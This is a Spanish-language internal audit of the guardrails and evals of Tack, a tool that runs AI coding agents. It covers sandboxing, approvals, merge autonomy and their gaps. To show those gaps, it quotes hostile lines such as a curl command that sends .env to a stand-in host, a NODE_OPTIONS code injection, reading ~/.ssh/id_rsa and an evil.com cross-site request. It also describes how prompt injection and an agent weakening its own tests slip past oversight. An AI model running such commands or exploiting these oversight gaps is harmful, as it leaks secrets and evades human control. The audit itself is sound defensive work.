# Auditoría de evals y guardrails de Tack

**Fecha:** 2026-11-06. **Rama:** `develop` en `b363899b`. Había tres archivos sin commit de otra sesión
(`CHANGELOG.md`, `crates/tack-runner/src/harness/docket/task.rs`, `crates/tack-runner/tests/docket_v5.rs`);
se leyeron tal como estaban.

**Pregunta:** qué evals y qué guardrails tiene Tack, qué hace cada uno (con ejemplos), qué de lo que
encontró la auditoría de docket del mismo día alcanza a los runs que Tack lanza, cómo se compara con la
práctica actual, si Tack practica **evaluación continua (EDD)** y qué implicaría una robusta, y qué sobra.

**Plan asociado:** [`docs/plans/evals-y-guardrails-2026-11-06.es.md`](../plans/evals-y-guardrails-2026-11-06.es.md).

**Auditoría hermana:** la de docket, `rack-cli/internal-docs/audits/evals-y-guardrails-2026-11-06.es.md`
(fuera de este repositorio). Este informe sigue su formato y no repite su contenido: la cita donde una
brecha de docket llega a un run de Tack (§2.4 y §3).

**Método:**

- Lectura directa del código, las ADR, `ci.yml`, `.githooks/pre-push`, `docs/TESTING.md` y la suite live
  (`onboarding-lab/e2e/`, fuera de git).
- Tres inventarios de lectura hechos por agentes (verificación de runs, guardrails del runner y guardrails
  del tablero), con citas `archivo:línea`.
- Comprobé a mano los quince hallazgos más fuertes:
  - `claude_code.rs:352` (`bypassPermissions`), `:43` (`.claude` con escritura) y `:67-70` y `:383-391` (lectura y web sin preguntar);
  - `sandbox.rs:8` (la red no se corta);
  - `local_process.rs:736` (la regla "sin sandbox, debe poder preguntar");
  - `prepare.rs:3-5` y `:244-260` (instalación sin jaula);
  - `docket/probe.rs:660` y `auto_start.rs:376-388` (el sandbox de docket se supone);
  - `config.rs:332` (verificador apagado) y `verify.rs:9`;
  - `checked_files.rs`;
  - `tack-core/src/autonomy.rs:224-232` y `tack-app/src/autonomy.rs:300-360` (techo y firma);
  - `middleware.rs:130` (cookie);
  - `tack-cli/src/config.rs:149` (`tack mcp` como operador);
  - `event_sink.rs` sin llamadores;
  - `handlers/metrics.rs:96-112` (dólares).
- Las fuentes externas no se volvieron a buscar. La comparación (§5) usa las fuentes primarias que cita
  la auditoría de docket y otras anteriores a 2026 que son de dominio común (SWE-bench, τ-bench,
  AgentDojo, CaMeL, OWASP).
- **No ejecuté ningún eval ni ningún test.** Los recuentos de tests salen de buscar `#[test]` y
  `#[tokio::test]`, y son aproximados.

Etiquetas:

- **[código✓]** verificado a mano en el camino vivo;
- **[código]** tomado del inventario con su cita, sin volver a comprobar;
- **[doc]** solo afirmado en prosa;
- **[docket]** afirmación de la auditoría de docket, no comprobada aquí;
- **[P]** fuente primaria externa;
- **[P vía docket]** fuente primaria citada por la auditoría de docket, sin abrir aquí.

**Cómo leer este informe:**

- §0 separa guardrail, test, verificación por run y eval.
- §2 y §4 explican cada pieza.
- §3 y §5 dicen qué falta.
- §6 trata la evaluación continua.
- §7 dice qué sobra.

---

## 0. Cuatro palabras que hay que separar

docket separa tres palabras. Tack necesita una cuarta, porque tiene una pieza que docket no tiene: un
juicio sobre **cada run** que queda guardado.

| | **Guardrail** | **Test** | **Verificación por run** | **Eval** |
| --- | --- | --- | --- | --- |
| **Qué es** | Un control que actúa **antes o mientras** el agente trabaja | Una comprobación de que **el código de Tack** hace lo que dice | Un juicio sobre **un run concreto, en producción**, al terminar | Una medición de **qué tan bien trabaja** un equipo de agentes, sobre muchas corridas |
| **Modelo** | El real | Uno falso (un harness o un docket de mentira) | El real | El real |
| **Resultado** | Dejar pasar, preguntar, rechazar, cortar | Pasa o falla, siempre igual | Un veredicto: merge, revisar o rechazar; aceptado o rechazado por una persona | Un porcentaje con margen de error |
| **Ejemplo en Tack** | "Un change set de un agente espera a que una persona lo aplique" | "Si una petición trae `LD_PRELOAD`, el runner la rechaza antes de lanzar" | "prill firmó `merge` para este run; la persona lo rechazó con el motivo 'cambió el test'" | "De 20 tareas de My SaaS, Claude Code con Sonnet resuelve 12 (±4); prill aprueba 3 que una persona rechazó" |

Dos reglas para todo el informe:

1. **Un guardrail no dice si el trabajo quedó bien, y un eval no impide nada.**
2. **La verificación por run no es un eval, pero sus veredictos son etiquetas.** Cada "aceptado", cada
   "rechazado con motivo" y cada revert es la verdad que un eval necesita y que docket no tiene. Tack
   las guarda todas y no las usa para medir nada.

---

## 1. Veredicto en una pantalla

| | Fuerte | Débil |
| --- | --- | --- |
| **Guardrails del tablero** | Se cierran ante la duda. Credenciales de agente con scopes, guardadas como hash, que vencen a los 90 días. Una tabla cerrada de rutas: un agente propone y una persona aplica (change sets, Propose por defecto). Un segundo secreto para contestar decisiones, degradación automática tras un revert, triggers que no se despiertan a sí mismos. Cada regla tiene su test en una suite de frontera, obligatoria en CI y en el pre-push. | `tack mcp` sin credencial es el **operador**. El origen "MCP" es un header que pone el cliente. El techo del equipo deja pasar el merge cuando no tiene datos. La decisión del auto-merge no está atada a lo firmado. El botón Merge mergea un `reject` sin detenerse. |
| **Guardrails del runner** | `env_clear()` más una denylist de nombres. Git nunca ejecuta código del repositorio (hooks apagados y hash de la config). Workspace confinado sin symlinks. Secretos solo por referencia permitida. Redacción de valores conocidos. Con bwrap, el agente no ve `~/.ssh` ni los tokens. | **La red nunca se corta.** Sin bwrap el agente corre sin jaula. En `auto`, Claude Code corre con `bypassPermissions` aunque no haya jaula. `~/.claude` y `~/.codex` tienen escritura dentro de la jaula. La instalación de dependencias corre sin jaula y con todo el entorno. **El sandbox de docket se supone, no se pregunta.** |
| **Verificación por run** | Un pack firmado (in-toto) y atado al commit. La config de prill se lee del commit base. El árbol verificado es el que se publica. El auto-merge exige firma, etapas, CI y presupuesto. | El verificador está **apagado por defecto** y nunca cambia el resultado del run. Los tests corren sobre el commit del agente, que puede debilitarlos. "Cambió cómo se le revisa" solo se anota. Hay dos almacenes de revisión humana. |
| **Evals** | Instrumentos de producto sólidos: unos 2.270 tests de Rust y 150 archivos de Vitest, cuatro suites de frontera obligatorias, pisos de cobertura (78,93 % y 80 % de las líneas cambiadas), mutantes cada semana, docket y prill falsos con detección de deriva, y una suite live de 35 tests contra docket, prill y un modelo reales. | **No hay ningún eval de calidad.** La suite live acepta cualquier veredicto en sus caminos felices, corre una vez a mano y guarda los resultados fuera de git. Nadie mide qué perfil o modelo resuelve más, si prill aprueba trabajo que una persona rechaza, ni cuánto estorban las aprobaciones. |
| **EDD** | La cultura de "medir y luego planificar" y de "prueba live por fase" está escrita (`CLAUDE.md`, roadmap). TDD con compuertas automáticas. | El instrumento mide **flujo** (¿llega el run al final?) y no **calidad**. Un cambio en el prompt que compone Tack puede empeorar el trabajo sin que nada lo detecte. **Madurez 1 de 5 en calidad del agente** (§6). |

La conclusión central: **Tack contiene bien lo que pasa en el tablero y mal lo que pasa en la máquina, y
ya guarda, sin usarlas, las etiquetas humanas que a docket le faltan para medir calidad.** Además, lo
que pasa en la máquina **cambia según el agente**: Claude Code, Codex, opencode y docket tienen cada uno
huecos distintos, porque los controles son flags de cada CLI y no reglas del runner (§2.6, G18).

El plan hace tres cosas:

1. cierra la contención del runner, midiendo antes y después;
2. convierte los veredictos humanos en cifras de calidad por perfil, modelo, harness y equipo;
3. monta el ciclo EDD para los cambios que tocan lo que el agente lee.

---

## 2. Los guardrails de Tack, explicados

### 2.1 El camino de un run

docket mira **cada acción** del modelo en un único punto de control. Tack no ve las acciones una por
una, salvo las preguntas. Mira **cada run** en cinco momentos: quién lo pide, si puede correr, qué recibe,
dentro de qué corre y qué pasa con lo que entrega.

```text
alguien pide un run (una persona, auto-start, un trigger, MCP, un agente gestor)
 ├─ ¿quién llama?                         token, credencial de agente o de runner       (familia 1)
 ├─ ¿puede pedir esto?                    rutas cerradas, change sets, escalera          (familia 2)
 ├─ ¿se puede correr?                     árbol, perfil, equipo que encaja, tokens del día (familia 3)
 ├─ en el runner: ¿qué recibe?            entorno, secretos, texto cercado, instalación  (familia 4)
 ├─ el agente corre:                      jaula, workspace, git, flags de la CLI         (familia 5)
 │                                        red                                            (familia 6)
 │   mientras corre:                      preguntas a una persona                        (familia 7)
 │                                        tokens, tiempo, salida, matar el árbol         (familia 8)
 ├─ al terminar: ¿el resultado vale?      reglas de salida, evidencia, verificador       (familia 9)
 ├─ ¿se mergea?                           escalera L3/L4/L5, techo, firma, CI            (familia 10)
 └─ después                               degradación tras un revert, registro, avisos   (familia 11)
```

**Ejemplo completo.** Auto-start arranca "Arreglar el redondeo" con el perfil Code (Claude Code), en un
runner **sin bwrap**:

1. Auto-start comprueba que no haya un run abierto, que no queden bloqueos, que haya perfil, máquina,
   tokens del día y sitio bajo `max_open`. Como una máquina elegible no tiene jaula, fija las
   aprobaciones en `ask`.
2. El runner limpia el entorno y añade solo lo que lista el descriptor de Claude Code. Hace un clon
   privado del repositorio y corre la instalación (`npm ci`) **sin jaula y con su entorno entero**.
3. Claude Code arranca en modo `default`, con las preguntas por `stdio`. `Read`, `Grep`, `WebFetch` y
   `WebSearch` pasan sin preguntar; un `Bash` aparece en **Asking you**. La persona lo aprueba (hace
   falta el token de decisiones).
4. El runner cuenta los tokens; si llega al límite, cancela.
5. Al terminar:
   - `is_error` es falso, el diff no está vacío y el hash de la config de git no cambió;
   - la evidencia se captura;
   - si el verificador está encendido, prill firma `merge`.
6. El proyecto está en L3, así que nada se mergea solo. La persona revisa y acepta, lo que abre el PR.
   El botón Merge exige la CI en verde.

**El mismo run, enviado por la API con `approvals: auto`:** Claude Code corre con
`--permission-mode bypassPermissions` **y sin jaula**, con el acceso de tu usuario a la máquina. Ninguna
regla del runner lo impide (G1).

### 2.2 Las once familias de guardrails

Cada familia responde a una pregunta distinta. Las rutas de código están en §2.5.

---

#### Familia 1 · ¿Quién llama? (identidad)

- **Para qué sirve:** que solo tú, tus agentes y tus runners hablen con el tablero, cada uno con su llave.
- **Cómo funciona:**
  - Un **token de operador** que se genera solo en loopback (32 bytes en un archivo 0600). Fuera de
    loopback, el servidor no arranca sin token salvo con un opt-out explícito y anotado. Se compara en
    tiempo constante.
  - La página entrega ese token en una cookie `HttpOnly; SameSite=Strict` para `/api`.
  - `Host` tiene que nombrar este servidor (421 si no). Una escritura `cross-site` o con un `Origin`
    ajeno recibe 403.
  - Los runners tienen su propia credencial, con hash y en otro montaje: no sirve como token de operador
    ni al revés.
  - Contestar una decisión exige además el header `x-tack-decision-token`.
- **Ejemplos:**
  - una página de `evil.com` hace `POST` a `127.0.0.1:3210/api/items` → 403;
  - un ataque de DNS rebinding con `Host: evil.com` → 421.
- **Qué no cubre:**
  - Quien carga la página recibe el token del operador. Detrás del túnel, Access es la única puerta, y la
    cookie no lleva `Secure` ni `Max-Age` (G14).
  - Hay un único token, con todos los poderes, sin rotación.
  - `tack mcp` usa ese token por defecto (G10).

---

#### Familia 2 · ¿Qué puede hacer un agente en el tablero? (principales y change sets)

- **Para qué sirve:** que un agente pueda leer y proponer, pero no cambiar el tablero ni aprobarse a sí
  mismo.
- **Cómo funciona:**
  - **Credencial de agente:** se guarda como hash y se muestra una sola vez; vence a los 90 días; tiene
    como máximo 20 scopes. Una revocada o vencida responde igual que una desconocida (401).
  - **Tabla cerrada de rutas:**
    - lo que no está listado da 403 (`OperatorOnly`);
    - una escritura directa a ítems, comentarios o dependencias da `ChangeSetOnly`;
    - arrancar runs, contestar decisiones y aplicar change sets es solo del operador.
  - **Escalera "Agentes en el tablero":** Read, Propose, Act y Create. El nivel efectivo es el menor
    entre el del proyecto y el scope de la credencial.
    - **Por defecto, Propose:** todo espera a una persona.
    - Un set tiene como máximo 100 operaciones y un motivo de 1 a 2.000 caracteres. Se valida entero y
      se aplica en una transacción, o se rechaza entero.
  - **Una persona decide:** aplica todo o parte, edita, o rechaza con un motivo. Antes de aplicar, el set
    se vuelve a validar contra el tablero tal como está.
  - **Triggers:** como máximo de 1 a 100 runs en 24 h móviles; una pausa de hasta 3.600 s. Un evento
    causado por el propio principal no lo despierta (`is_echo`). Un solo run abierto. Un arranque
    fallido también cuenta.
- **Ejemplo:** el agente gestor propone "mover 3 tareas a Doing y crear 2". El set queda esperando; el
  operador aplica 2 de las 5 operaciones.
- **Qué no cubre:**
  - En Act, el `Move` de un agente se aplica sin persona, en tensión con "una persona fija el estado"
    (fase 86).
  - No hay regla de dos personas: una sesión MCP con el token de operador propone y aplica su propio
    set.
  - El `origin` del set lo elige el cliente.
  - Un trigger programado no vuelve a comprobar que su credencial siga activa antes de arrancar.
  - Los principales `auto_start` y `trigger:<id>` son texto libre (G15).

---

#### Familia 3 · ¿Se puede arrancar este run? (admisión)

- **Para qué sirve:** que no arranque un run que no tiene sentido o que no cabe.
- **Cómo funciona:**
  - Árbol: como máximo 5 niveles y sin ciclos. Un **grupo** solo se corre con un perfil Planner o
    Researcher.
  - El perfil tiene que resolverse y nombrar un agente; `agent_profile_snapshot` se rechaza.
  - El repositorio tiene que ser el del proyecto. Un runner revocado se rechaza.
  - Tiene que quedar sitio en los tokens del día (2M provisional cuando nada fija otro límite).
  - **Auto-start**, apagado por defecto, salta una tarea con un run abierto, bloqueos, sin perfil, sin
    máquina, sin presupuesto o sin sitio bajo `max_open`. No mueve el estado.
  - Un equipo que no puede hacer lo que la tarea pide se rechaza en el runner: "Not started", con el
    motivo.
  - Un run por MCP se crea con `ask` y sin red.
- **Ejemplo:** un perfil Codex apuntado a una épica → "un grupo se planifica, no se corre".
- **Qué no cubre:**
  - El encaje del equipo se abre cuando faltan datos, por diseño (ADR 0036).
  - El `ask` de MCP lo impone **el cliente MCP**, no el servidor (G10).

---

#### Familia 4 · ¿Qué recibe el run? (entorno, secretos, texto)

- **Para qué sirve:** que una petición no cambie qué programas corren ni se lleve secretos del runner, y
  que el texto de una tarjeta no se lea como una orden.
- **Cómo funciona:**
  - El proceso arranca con `env_clear()` y solo hereda lo que lista el descriptor de cada agente.
  - Una petición no puede fijar:
    - `HOME`, `PATH`, `NODE_OPTIONS`, `PERL5OPT`, `RUBYOPT`, `BASH_ENV`, `ENV`;
    - nada que empiece por `GIT_`, `SSH_`, `LD_`, `DYLD_` o `PYTHON`;
    - nada que termine en `_BASE_URL`.
  - Un `store:` solo se acepta si el runner lo lista; **la lista está vacía por defecto**. Un `env:` que
    viene de la petición se rechaza. El `[environment]` del runner se aplica al final.
  - Los secretos van al llavero del sistema o a un archivo 0600, nunca a la línea de comandos.
  - El texto de la tarjeta va entre `<<<card-text id=…>>>`, con un id aleatorio, y una línea dice que es
    texto de la tarjeta y no una instrucción. La página del run muestra el prompt compuesto ("What the
    agent read").
- **Ejemplo:** una petición con `NODE_OPTIONS=--require /tmp/x.js` → rechazada antes de lanzar.
- **Qué no cubre:**
  - Es una denylist, y se le escapan `HTTPS_PROXY`, `ALL_PROXY`, `NODE_PATH`, `JAVA_TOOL_OPTIONS`,
    `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `XDG_CONFIG_HOME` y `npm_config_*`. El propio módulo dice que
    bloquea lo que cambia "where its traffic goes" (G11).
  - La marca `trusted` del ítem solo llega a docket (G12).
  - Los archivos del repositorio y las páginas web que lee el agente no van cercados.

---

#### Familia 5 · La contención del agente (jaula, workspace, git, flags de la CLI)

- **Para qué sirve:** que, aunque el agente se equivoque o lo engañen, el daño quede dentro de su copia.
- **Cómo funciona:**
  - **bwrap**, si está en el `PATH` y en Linux:
    - los directorios del sistema son de solo lectura y `/tmp` es privado;
    - `/proc` y `/dev` son nuevos;
    - `--unshare-pid --die-with-parent --new-session`;
    - un `$HOME` falso y el workspace con escritura;
    - **también con escritura** `~/.claude` o `~/.codex`, según el agente.

    Nunca se montan el estado del runner, `~/.ssh` ni el archivo del token.
  - **Workspace:** el directorio se canoniza, se rechazan los symlinks y se hace un clon privado por
    intento.
  - **Git:**
    - `core.hooksPath=/dev/null`, `fsmonitor=false` y `protocol.ext.allow=never`;
    - `GIT_CONFIG_NOSYSTEM`;
    - un hash de la config antes y después: si cambia, el run falla (`repository_config_changed`) y no
      se publica nada;
    - el push va a la URL registrada, y está apagado por defecto.
  - **Flags de cada CLI:**
    - Claude Code carga solo las herramientas permitidas (`--tools`), ningún MCP
      (`--strict-mcp-config`) y ningún ajuste del usuario (`--setting-sources ""`). **En `auto` usa
      `bypassPermissions`.**
    - Codex corre en `workspace-write` o `read-only`, nunca en `danger-full-access`.
    - opencode lleva un bloque de permisos derivado de las herramientas permitidas.
- **Ejemplo:** dentro de bwrap, el agente hace `cat ~/.ssh/id_rsa` → no existe, porque no está montado.
- **Qué no cubre:**
  - **Sin bwrap el agente corre igual**, sin jaula. En macOS no hay jaula *(inferido: solo se busca
    bwrap)* (G3).
  - El perfil es fino: sin espacios de nombres de red, IPC ni usuario, sin seccomp, sin `--cap-drop`, y
    `/etc` se lee entero (G3).
  - Con `~/.claude` y `~/.codex` escribibles, el agente puede leer sus tokens de login, que no están en
    la redacción. *(Inferido)* También podría dejar ajustes o hooks que tu CLI cargue después, fuera de
    la jaula (G4).
  - En modo `in_place`, `.git/hooks` no entra en el hash *(inferido)*.

---

#### Familia 6 · La red

- **Para qué sirve:** que el agente no saque datos ni visite sitios que no debe.
- **Cómo funciona:**
  - Para los agentes locales, **la red no se corta nunca**, por decisión: "the harness has to reach its
    model" (`sandbox.rs:8`).
  - El interruptor "Web tools" le quita `WebFetch` y `WebSearch` a Claude Code, no se le pasa a Codex, y
    opencode rechaza `network:false` (se cierra).
  - A docket se le envía `network: "none"` y, con el cambio aún sin commit, una política que bloquea
    `fetch`. Lo aplica docket.
- **Ejemplo:** con Web tools apagado, el agente corre `curl -d @.env https://x.example` en `Bash` →
  pasa.
- **Qué no cubre:**
  - Todo lo que sale por `Bash`.
  - En `ask`, Claude Code deja pasar `WebFetch` y `WebSearch` sin preguntar, y en opencode `webfetch`
    está siempre en `allow`. Un agente engañado puede sacar datos en una URL sin que nadie lo vea (G2).
  - La ADR 0018 (decisión 12) lo dice con honestidad: es "Advisory".

---

#### Familia 7 · Una persona en el bucle durante el run

- **Para qué sirve:** que las acciones de riesgo las decida una persona sin detener el resto.
- **Cómo funciona:**
  - Con `ask`:
    - Claude Code pregunta por `stdio`;
    - Codex usa `app-server` con `on-request`;
    - opencode lleva `ask` en su bloque de permisos.
  - Cada pregunta aparece en **Asking you**. La respuesta tiene que ser una de las opciones registradas.
  - Para contestar hacen falta la sesión de operador **y** el token de decisiones. Un runner puede
    crear una decisión pero nunca resolverla.
  - Una pregunta vencida la contesta el runner con su opción de **negar**.
  - Las aprobaciones `outward` de docket se muestran solo con la llamada entera. Si docket no la manda,
    Tack dice "contéstala en docket". En L5, docket no pregunta a nadie.
  - **Por defecto:** el diálogo y auto-start ponen `ask` si alguna máquina elegible no tiene jaula, y
    `auto` si todas la tienen. MCP fuerza `ask`.
- **Ejemplo:** el agente quiere `rm -rf build/`. Aparece en **Asking you** y el run espera. Si nadie
  contesta antes de que venza, se niega.
- **Qué no cubre:**
  - Es **solo un valor por defecto**: la API acepta `auto` y el runner no lo cambia (G1).
  - `expires_at` es opcional: una pregunta sin fecha espera para siempre.
  - Nadie mide cuántas preguntas por cada 100 acciones se aprueban siempre, y por tanto solo
    estorban (G16).

---

#### Familia 8 · Límites de tokens, tiempo y salida

- **Para qué sirve:** que un agente atascado no gaste sin fin.
- **Cómo funciona:**
  - **Tokens por run:** los contados son la entrada menos las lecturas de caché, más la salida. Al
    llegar al límite, se cancela.
  - **Tokens del proyecto por día:** se admite un run según lo que queda.
  - **Límite aprendido por perfil:** el p90 × 1,5 tras 5 runs; los runs rechazados no cuentan.
  - docket recibe `maxTokens` y corta los pasos con `step_budget`; una persona elige Continue o Start
    over.
  - **Tiempo:** 1 h por defecto y 24 h como máximo. La salida tiene topes de 4 MiB y 1 MiB.
  - El agente tiene su propio grupo de procesos: SIGTERM y, a los 5 s, SIGKILL; `kill_on_drop`.
  - El tope de rework es 0 (apagado).
- **Qué no cubre (G13):**
  - Codex no informa su progreso, así que su límite no se aplica mientras corre.
  - Si la cancelación falla, solo se anota.
  - Un agente que no informa su uso nunca se corta.
  - Los subprocesos de `Bash` de Claude Code viven en su propia sesión y sobreviven a una cancelación
    sin jaula, contra lo que dice la ADR 0018 (decisión 10).

---

#### Familia 9 · ¿El resultado vale? (reglas de salida)

- **Para qué sirve:** que "terminé" no dependa solo de lo que diga el agente.
- **Cómo funciona:** reglas deterministas al terminar:

| Regla | Qué hace | Ejemplo |
| --- | --- | --- |
| Señal de la CLI | Claude Code: `is_error`; si falta el campo, falla. Un timeout es Failed. docket: `status:"done"` | "La CLI dice error → Failed" |
| No cambió nada | Un run que debía cambiar código y no tiene diff es Failed. Los de solo lectura y los de plan están exentos | "Dice 'listo' con el diff vacío → Failed" |
| Planner y Researcher | Si cambiaron algo que no sea `tack-plan.json` o el archivo de respuesta → Failed | "El Planner editó `src/` → Failed" |
| Config de git | El hash cambió → Failed, no se publica | "Añadió un `[alias]` → Failed" |
| Árbol verificado | Si el HEAD se movió entre la verificación y el push → `tree_changed_after_verification` | "Commit después de que prill firmó → Failed" |
| Esquema del plan | Un `plan-v1` inválido → `plan_invalid` | "Un padre que no existe → plan_invalid" |
| "Nunca arrancó" | Un rechazo (`harness_rejected`, `pipeline`, `"ceiling L<n>"`) se muestra como "Not started" | — |

- **Qué no cubre:** la regla del Planner se abre cuando falta la evidencia, con `outside_repository`, y
  en todos los runs de docket. Además se aplica después: el cambio ya se hizo en la copia.

---

#### Familia 10 · ¿Se mergea solo? (escalera de autonomía)

- **Para qué sirve:** que Tack solo mergee por su cuenta cuando subiste el nivel y todo está en verde y
  firmado.
- **Cómo funciona:**
  - **L3 por defecto.** Gana el dominio coincidente más bajo.
  - El **auto-merge** exige todo esto:
    1. el pack dice `merge`;
    2. el run no vino de MCP;
    3. el nivel es L4 o más;
    4. el techo del equipo lo permite: un equipo atendido queda en L3, y uno con nombre que la máquina no
       informa retiene el merge;
    5. las etapas que exige el proyecto existen y pasaron;
    6. la firma vale contra la clave del proyecto y el commit final;
    7. quedan tokens del día y merges del día;
    8. el PR está abierto y la CI en verde (si no hay CI, se retiene).

    El merge fija el `sha` verificado.
  - El **botón Merge** solo exige el PR abierto y la CI en verde. **Mergear al pasar a Done** exige lo
    mismo y además rechaza los runs que vinieron de MCP.
- **Ejemplo:** en L4, prill firma `merge` y la CI está en verde, pero el equipo es atendido → se retiene
  con "el equipo que hizo esto se queda en L3: necesita a una persona durante el run".
- **Qué no cubre (G8, G9):**
  - Si el techo no se conoce (`Ok(None)`), **pasa**.
  - La `decision` sale del `mrp.json` traducido por el runner; la firma solo se comprueba contra el
    commit. Nada ata la una a la otra.
  - El botón mergea un pack que dice `reject` sin detener a la persona.
  - El origen "MCP" es un header.

---

#### Familia 11 · Después: degradación, registro, avisos

- **Para qué sirve:** aprender de un merge que salió mal, y saber luego qué pasó.
- **Cómo funciona:**
  - Un auto-merge revertido, o que dejó la CI en rojo, le baja un nivel a su dominio o proyecto. Al
    llegar a L3 se apaga el auto-start. Subir de nivel es manual.
  - Hay filas para:
    - los merges (`tack_merges`);
    - los change sets y quién los propuso y aplicó;
    - quién escribió cada ítem;
    - los eventos del run, los nombres de las variables (nunca los valores), el estado de la jaula y el
      prompt compuesto.
  - Un inbox de avisos para lo que te necesita.
- **Ejemplo:** un auto-merge en el dominio `docs/` se revierte → `docs/` pasa de L4 a L3.
- **Qué no cubre:** los registros son filas planas de SQLite, **no encadenadas**. docket encadena su
  audit con hashes; Tack no (G15).

---

### 2.3 Con jaula y sin jaula

| | Sin bwrap (o en macOS) | Con bwrap |
| --- | --- | --- |
| ¿Corre el agente? | **Sí.** Solo se rechaza el que no sabe preguntar, y los tres que trae Tack saben | Sí |
| Aprobaciones por defecto | `ask` (diálogo y auto-start); **la API puede mandar `auto`** | `auto` |
| Claude Code en `auto` | `bypassPermissions` **con el acceso de tu usuario** | `bypassPermissions` dentro de la jaula |
| `~/.ssh`, el token, el estado del runner | Visibles | Invisibles |
| `~/.claude`, `~/.codex` | Los tuyos | Los tuyos, **con escritura** |
| Red | Abierta | Abierta |
| Instalación de dependencias | Sin jaula, con todo el entorno | **Igual**: sin jaula, con todo el entorno |
| Al cancelar | Los subprocesos de `Bash` de Claude Code pueden sobrevivir | `--die-with-parent` |

### 2.4 Lo que Tack delega en docket (cruce con su auditoría)

En un run de docket, las familias 5 a 8 las aplica **docket**. Su auditoría dice qué tan bien. Esto es lo
que alcanza a Tack:

| Pieza | Quién la aplica | Lo que dice la auditoría de docket | Qué significa para Tack |
| --- | --- | --- | --- |
| Jaula | docket: Landlock + seccomp, Seatbelt o Docker | Se enciende si la máquina la soporta. Si se pidió y no hay soporte, docket se niega; **sin soporte y sin pedirla, todo corre sin jaula** [docket] | **El probe de Tack fija `sandbox: "harness"` siempre** (`probe.rs:660` [código✓]), así que auto-start y el diálogo tratan a docket como enjaulado y ponen `auto` (`auto_start.rs:376-388` [código✓]). Si el docket de esa máquina corre sin jaula, Tack no lo sabe (**X1**, en G6) |
| Texto de la tarea | docket | La regla anti-inyección **no mira** las tareas que llegan por HTTP; detecta 4 de 28 variantes y solo anota. Su GR4 deja abierto si "el HTTP de Tack es de confianza" [docket] | Tack ya manda `trusted` por ítem (`start_run.rs:1334` [código✓]). La respuesta a docket es que **la confianza sigue al ítem, no al canal** (plan §10) |
| Salida de herramientas | docket | Vuelve al modelo **sin marca de no confiable** (G1 de docket) [docket] | Afecta a todo run de docket que lanza Tack, y Tack no puede compensarlo |
| "Cambió su propio examen" | docket (`pre_hop`) y Tack (`checked_files.rs`) | En docket, la tarea **espera a una persona** aunque todo esté en verde, salvo en pods de carpeta (G5 de docket) [docket] | Hay dos listas con distinto contenido y distinto efecto: la de docket retiene, la de Tack solo anota en el pack. Una sola dueña por clase de run (plan, L3) |
| Veredicto del Reviewer | docket | Nadie mide si acierta (G9 de docket) [docket] | **Tack ve qué hizo la persona con ese mismo run** (aceptó, rechazó, revirtió). Es el único lugar donde se puede medir al Reviewer y a prill (§6.4) |
| Registro | docket | Encadenado, con `docket log verify` [docket] | El de Tack no lo está (G15) |
| Ruido de aprobaciones | docket (lo planea en GR8) | No lo mide [docket] | Tack muestra las aprobaciones de docket y las de sus agentes locales. Cada uno mide las suyas, sin duplicar |
| Herramientas MCP | docket | No las fija por huella (G7 de docket) [docket] | En agentes locales no aplica: Claude Code corre sin MCP (`--strict-mcp-config` [código]) |

### 2.5 Referencia técnica (dónde vive cada familia y qué la prueba)

Las rutas son relativas a `crates/`.

| Familia | Código | Pruebas |
| --- | --- | --- |
| 1 Identidad | `tack-api/src/middleware.rs:59-92, 111-138, 203-263, 275-348`; `tack-api/src/config.rs:216, 258`; `handlers/runner_protocol/runner_auth.rs:128-200`; `handlers/decisions.rs:134-158` | `tack-api/tests/security/trust_boundary.rs` (suite de frontera), tests de `middleware.rs` |
| 2 Tablero | `tack-api/src/agent_access.rs:58-224`; `tack-core/src/principal.rs`, `change_set.rs:357-509`; `tack-app/src/change_sets.rs:248-503`, `runs/agent_credential.rs:46-135`; `tack-core/src/trigger.rs:203-325`; `tack-app/src/triggers.rs:281-545` | `agent_access.rs:226-386`; `change_set/tests.rs` (21); `tack-app/tests/{change_sets,agent_credential,triggers}.rs`; suite live 22–27 |
| 3 Admisión | `tack-core/src/hierarchy.rs:70-125`, `auto_start.rs:42-81`; `tack-app/src/runs/start_run.rs:741-776, 1290-1386`, `auto_start.rs:191-388`; `tack-protocol/src/execution/capabilities.rs:535`; `tack-runner/src/harness/local_process.rs:780-815`, `docket.rs:1894-1905` | `tack-app/tests/{start_run,work_runs_group_is_planned}.rs`; `tack-core` auto_start (3) |
| 4 Entrada | `tack-runner/src/harness/env_policy.rs`, `harness/mod.rs:79-136`, `secrets.rs`, `process.rs:229`; `tack-cli/src/secure_fs.rs`; `tack-protocol/src/execution/types.rs:554-586`; `tack-app/src/runs/start_run.rs:309-330`; `tack-runner/src/prepare.rs` | `tack-runner/tests/agent_boundaries.rs:205-257, 873, 969`; `secrets/tests.rs` |
| 5 Contención | `harness/sandbox.rs:100-214`; `harness/local_process.rs:680-747, 923-944`; `workspace.rs:352`; `git.rs:129-137, 1191-1240`; `harness/claude_code.rs:295-417`, `codex.rs:110-119, 241-266`, `opencode.rs:353-409` | `agent_boundaries.rs:377, 457-750` (bwrap real en CI con `TACK_REQUIRE_BWRAP=1`); `h3_checkout.rs:887`; `claude_code/tests.rs` |
| 6 Red | `harness/sandbox.rs:8`; `claude_code.rs:67-70, 383-391, 478`; `opencode.rs:404`; `harness/docket/task.rs:302-361` | `claude_code/tests.rs:46, 66`; suite live (docket) |
| 7 Persona | `harness/claude_code.rs:340-352`; `codex.rs:313-315`; `engine.rs:1048-1053`; `harness/docket.rs:956, 980-1072, 1559`; `tack-app/src/runs/{create,resolve,expire}_decision*.rs`; `tack-cli/src/mcp/runs.rs:165` | `tack-api/tests/runner_protocol/decisions.rs`; `tack-app/tests/resolve_decision.rs`; `docket/tests.rs:207-222`; `mcp/tests.rs:492` |
| 8 Límites | `engine.rs:1080-1178`; `engine/outcome.rs:26-59`; `tack-db/src/repo/budgets.rs:19`; `tack-app/src/scheduler_wiring.rs:153-179`; `harness/local_process.rs:57, 826-838`; `process.rs:116, 243, 714-796` | `engine/tests.rs`; `process/tests.rs` |
| 9 Salida | `engine/outcome.rs:152, 440-525`; `engine.rs:811-823`; `evidence.rs:329-355`; `tack-core/src/run_outcome.rs` | `engine/tests.rs:3820`; `tests/plan_contract.rs`; `tests/h3_checkout.rs` |
| 10 Merge | `tack-core/src/autonomy.rs:75-90, 206-246`; `tack-app/src/autonomy.rs:150-175, 220-391`, `merge.rs:71-215`; `tack-api/src/prill.rs:57-110` | tabla de `autonomy.rs` (`evaluate_table`); `tack-api/tests/handlers/{autonomy,merge_button}.rs`; suite live 11, 12, 14 |
